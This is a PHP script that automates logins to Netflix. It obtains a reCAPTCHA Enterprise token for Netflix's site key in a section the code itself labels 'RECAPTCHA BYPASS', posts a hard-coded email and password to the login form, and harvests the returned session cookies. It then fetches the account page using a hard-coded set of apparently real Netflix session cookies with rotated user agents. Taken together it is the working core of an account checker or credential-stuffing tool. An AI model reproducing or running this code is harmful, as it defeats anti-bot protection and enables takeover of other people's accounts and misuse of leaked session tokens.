<?php


function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}

$response = file_get_contents("https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LeDeyYaAAAAABFLwg58qHaXTEuhbrbUq8nDvOCp&co=aHR0cHM6Ly93d3cubmV0ZmxpeC5jb206NDQz&hl=en&v=Km9gKuG06He-isPsP6saG8cn&size=invisible&cb=eeb8u2c3dizw", true);

preg_match('/value="(.*?)"/i', $response, $match);
$api = $match[0];

$decode = str_replace('value="','',$api);
$decode = str_replace('"','',$decode);
$token = $decode;
$postto = array(
    "v" => "Km9gKuG06He-isPsP6saG8cn",
    "reason" => "q",
    "c" => $token,
    "k" => "6LeDeyYaAAAAABFLwg58qHaXTEuhbrbUq8nDvOCp",
    "co" => "aHR0cHM6Ly93d3cubmV0ZmxpeC5jb206NDQz",
    "chr" => "%5B38%2C84%2C94%5D",
    "vh" => "-1149792284",
    "bg" => "kJaglpMKAAQeH2NlbQEHDwG3HgHkYmipwKZLvmAaGCIeO2knGyVi2lcc2d6we_IGLhXPTCrcRQSrXqn4n0doqzQ2i8Aw3_eUeSUIgbovYaDXYEy1YBiouAQe5rUbIuXh6jLItmtbpiCsvNHrJfqr1eDApuNn8jqVtZfpo12Bpl28T4S-BN-zefP60wgs4AhJqZMbHngai-9VnGYfde5EihgOR2s5FgJjWkNW4g7J4VixwycoKpPM_VkmmY-Mcl6SI4svUrXzKNBLbPXY0Zjp5cLyEh7O1UTPCe8OPj0cg6S7xPPpkZR9zKmDhy5adr982aTJZTFmV8R1p1OcDmT78D03ZgPRwzgoK_IpSvgrM-IPQfE_Qu-7zclFDMSkBPLUj1VxaolIdknp8Ap7AGfixtbK4_kZuDl853ea737GPv2dppnZdXciU8rN2RJXyhjWWDYOYIxnlqfzefYHNZsxmujutGJevWfWU_4tAMie6uvg1HXDF0BDj_s9H8UE8Gykb6M3qQVt12JCK_EBcmbrg8CiT_MK4L_ys7phshwm6-9Cy5YFQ3hS9oxYO-SSDY2r9QiNXDgccVpQ528Nf7V0gG3Z9xHJVmLpwpwB_F_L6dREoaPX_UnxiJoOR1gkg04uS4BswFxmzOJpB45VKJvbaBENYQabVtIiKUhgVwiBYH7-9NHvlbuYcHtCLf6piKcmdKxQXBEjphi1HISp-nLa2bIA47mjNOylD9ZWOp05PMuPSUJxr9SUCQTym2nNLPiWj9tJkyUzy0UVi6_QSIX7vf5JaVGJB3zfs5fCXQmDC7VGPT40_sQEfxQuCRZ8y67Mq8R64OZtbnlHX7JWE80myuXHQue_EjMLCJlQbaGhEJxNF25XzzseCLgVwNNVG6uUjgq_2-BTuNdyHd38y1hcsryXqaskJ2DsFh3P0mbHxE8viABVpzBWtSRjkH_OPXa_dus8OCqQI8I60lPXJ9lWU9aCMeAkD5T6VIfFvqCXZ_bfuX7ugp9ADo5bkFcSnQJrmAobrmuOHh3zvIZmIHr4hZ7jsH_ANy_w6JNSsbifs2-BA45a7crLyEC1tuFq_yvCXR-fH3F8uSoVobZK1MreQuW_8zBrI1w1vwb7-2teKDEK41orAry1P7ib-fzo08KiPvPDJ3MQi3XQeOzAcQwRjhRNDbtAcDE-XRSkN_CsRg9dmygO-wwM7X607rH-RvNw-CBjt_pB4V-xd83GKtfI7VZZ48iNywixzOoIPsNv2_oqLHNGSc9gvMNtegcNKU7UtUiiZR5sIps",
    "size" => "invisible",
    "h1" => "en",
    "cb" => "eeb8u2c3dizw",
);

$querys = http_build_query($postto);

//echo $token;

//$post = "?v=Km9gKuG06He-isPsP6saG8cn&k=6LeDeyYaAAAAABFLwg58qHaXTEuhbrbUq8nDvOCp&reason=q&c=".$token."&co=aHR0cHM6Ly93d3cubmV0ZmxpeC5jb206NDQz&hl=en&size=invisible&chr=%5B38%2C84%2C94%5D&vh=-1149792284&bg=kJaglpMKAAQeH2NlbQEHDwG3HgHkYmipwKZLvmAaGCIeO2knGyVi2lcc2d6we_IGLhXPTCrcRQSrXqn4n0doqzQ2i8Aw3_eUeSUIgbovYaDXYEy1YBiouAQe5rUbIuXh6jLItmtbpiCsvNHrJfqr1eDApuNn8jqVtZfpo12Bpl28T4S-BN-zefP60wgs4AhJqZMbHngai-9VnGYfde5EihgOR2s5FgJjWkNW4g7J4VixwycoKpPM_VkmmY-Mcl6SI4svUrXzKNBLbPXY0Zjp5cLyEh7O1UTPCe8OPj0cg6S7xPPpkZR9zKmDhy5adr982aTJZTFmV8R1p1OcDmT78D03ZgPRwzgoK_IpSvgrM-IPQfE_Qu-7zclFDMSkBPLUj1VxaolIdknp8Ap7AGfixtbK4_kZuDl853ea737GPv2dppnZdXciU8rN2RJXyhjWWDYOYIxnlqfzefYHNZsxmujutGJevWfWU_4tAMie6uvg1HXDF0BDj_s9H8UE8Gykb6M3qQVt12JCK_EBcmbrg8CiT_MK4L_ys7phshwm6-9Cy5YFQ3hS9oxYO-SSDY2r9QiNXDgccVpQ528Nf7V0gG3Z9xHJVmLpwpwB_F_L6dREoaPX_UnxiJoOR1gkg04uS4BswFxmzOJpB45VKJvbaBENYQabVtIiKUhgVwiBYH7-9NHvlbuYcHtCLf6piKcmdKxQXBEjphi1HISp-nLa2bIA47mjNOylD9ZWOp05PMuPSUJxr9SUCQTym2nNLPiWj9tJkyUzy0UVi6_QSIX7vf5JaVGJB3zfs5fCXQmDC7VGPT40_sQEfxQuCRZ8y67Mq8R64OZtbnlHX7JWE80myuXHQue_EjMLCJlQbaGhEJxNF25XzzseCLgVwNNVG6uUjgq_2-BTuNdyHd38y1hcsryXqaskJ2DsFh3P0mbHxE8viABVpzBWtSRjkH_OPXa_dus8OCqQI8I60lPXJ9lWU9aCMeAkD5T6VIfFvqCXZ_bfuX7ugp9ADo5bkFcSnQJrmAobrmuOHh3zvIZmIHr4hZ7jsH_ANy_w6JNSsbifs2-BA45a7crLyEC1tuFq_yvCXR-fH3F8uSoVobZK1MreQuW_8zBrI1w1vwb7-2teKDEK41orAry1P7ib-fzo08KiPvPDJ3MQi3XQeOzAcQwRjhRNDbtAcDE-XRSkN_CsRg9dmygO-wwM7X607rH-RvNw-CBjt_pB4V-xd83GKtfI7VZZ48iNywixzOoIPsNv2_oqLHNGSc9gvMNtegcNKU7UtUiiZR5sIps";

$post = "?$querys";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.google.com/recaptcha/api2/reload?k=6LeDeyYaAAAAABFLwg58qHaXTEuhbrbUq8nDvOCp");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $querys);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$header = [
    'Content-Type: Application/Json',
];
//curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
$respo = curl_exec($ch);
//echo $respo;

$kuwan = preg_match('/"rresp","(.*?)"/i', $respo, $matchz);
$kuwan = $matchz[1];
///================= RECAPTCHA BYPASS ==============//

$netflix = file_get_contents("https://www.netflix.com/ph-en/login", true);

preg_match('/<input type="hidden" name="authURL" value="(.*?)"/i', $netflix, $authurl);
$authurls = $authurl[1];
//echo $netflix;

$ResponseTime = rand(100, 800);


$netflixdata = array(
    "userLoginId" => "userLogs@gmail.com",
    "password" => "TestTest21",
    "rememberMe" => "true",
    "flow" => "websiteSignUp",
    "mode" => "login",
    "action" => "loginAction",
    "withFields" => "rememberMe%2CnextPage%2CuserLoginId%2Cpassword%2CcountryCode%2CcountryIsoCode%2CrecaptchaResponseToken%2CrecaptchaError%2CrecaptchaResponseTime",
    "authURL" => $authurls,
    "nextPage" => "",
    "showPassword" => "",
    "countryCode" => "+63",
    "countryIsoCode" => "PH",
    "cancelType" => "",
    "cancelReason" => "",
    "recaptchaResponseToken" => $kuwan,
    "recaptchaResponseTime" => $ResponseTime,
);

$netflixDatax = http_build_query($netflixdata);


$try = curl_init();
curl_setopt($try, CURLOPT_URL, "https://www.netflix.com/ph-en/login");
curl_setopt($try, CURLOPT_POST, 1);
curl_setopt($try, CURLOPT_POSTFIELDS, $netflixDatax);
$headss = [
    'User-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Referer: https://www.netflix.com/ph-en/login',
    'Content-type: application/x-www-form-urlencoded',
];

//($try, CURLOPT_HTTPHEADER, $headss);
curl_setopt($try, CURLOPT_HEADER, 1);
curl_setopt($try, CURLOPT_RETURNTRANSFER, true);
$responde = curl_exec($try);
curl_close($try);

preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $responde, $matches);
$cookies = array();
foreach ($matches[1] as $matchz) {
    parse_str($matchz, $cookie);
    $cookies = array_merge($cookies, $cookie);

}
    $cookieget = http_build_query($cookies);
    $SecureNetflixId = urlencode($cookies['SecureNetflixId']);
    $NetflixId = urlencode($cookies['NetflixId']);
    $flwssn = $cookies['flwssn'];
    $nfvdid = $cookies['nfvdid'];

   // echo "snID: $SecureNetflixId and nID: $NetflixId";

    $options = array('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36');

    $RandAgents = $options[array_rand($options)];
    $curl1 = curl_init();
    curl_setopt($curl1, CURLOPT_URL, 'https://www.netflix.com/YourAccount');
    curl_setopt($curl1, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl1, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($curl1, CURLOPT_HTTPHEADER, [
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language: en-US,en;q=0.9",
        "Cookie: flwssn=bbd3a0a5-cff3-4ff6-bafd-304318e1b038; netflix-sans-normal-3-loaded=true; netflix-sans-bold-3-loaded=true; sawContext=true; nfvdid=BQFmAAEBELixSjYm9HEqk8VFQzBjOqFgPXI4fnDGsMyiQ2j0ONugMCdfTkorre0k9rDaYOubWR9BKqwARQKWn53xzsD8r9CXbkaJAb9M_rI1nkH3dn4B4QFBC1bIWy0pMwmd8bcbS5BCI2cd8VyEzXPutT6Ia9s1; SecureNetflixId=v%3D2%26mac%3DAQEAEQABABTYpEzednh_z-hU0-8jefFLrkyspCx1SOo.%26dt%3D1701028100886; NetflixId=v%3D2%26ct%3DBQAOAAEBEC42Sc0yWIhHBKd9aGTcpS6BsNHJOZzT0nx-KVzbIGKafmFL5AZaYx-N_a1N0bfUQPoXB4bd2trxDPc82Ser0RVhI65kFDaaSW8TK-3iU5pgnTI3bkvUCmF_cKol19rHzOEguK6U_TKT2LuotGVLQCpK_Ddzu7bUuTyRz9C2ji-Dj81OPBtlekzFPWnhxB4oCxkKDrinksl4zQdY27kYZmNcnEivHG4jbO4fhoFhPi8QjmVOeqXlxCrcwIRGdWjwLSgCmA-q3FUcwS_paC-TNn0OrF2gOPrt1t_7_r4QUggFI74PeIvsHsir2wQTTFsOOiop0AHfHK0Eqr_kPl2CSntc2jvbqQoFcggI6w5F33QK9dtvmkJwCa157NB2n0aSlvsZ4QJWSRb4qyEyS0UvodVlSx_KnMK4HpwJ20Bs4UzWqioOYG3DY9HKqOfBrlTvA3o0wOZOsgCWhXPNpmi55UrM0Utnyr_Il6kM7Z_dUQoKc6t97KjJMAfGKRTfIuxjist6xrTRg83QfeL2gycBRIX1TBfo2pAzPHhUcyYFcOltsK_TTnquVtlnJgpEmH0uAMfUXpRPAwttZ5YpOG6_fTYGuQ..%26bt%3Ddbl%26ch%3DAQEAEAABABQmYqvkI7JJ1YvsrHSvMvacS8vSh_J_psg.%26mac%3DAQEAEAABABRVT75Wd-2B4JCjn7AN918mr0GgW1gzYks.; OptanonConsent=isGpcEnabled=0&datestamp=Mon+Nov+27+2023+03%3A48%3A16+GMT%2B0800+(China+Standard+Time)&version=202301.1.0&isIABGlobal=false&hosts=&consentId=a10f9bcc-307d-44bb-9f84-c5b3acd3ae99&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1&AwaitingReconsent=false",
        "Referer: https://www.netflix.com/browse",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36",
    ]);
    $responsexx = curl_exec($curl1);
    echo $responsexx;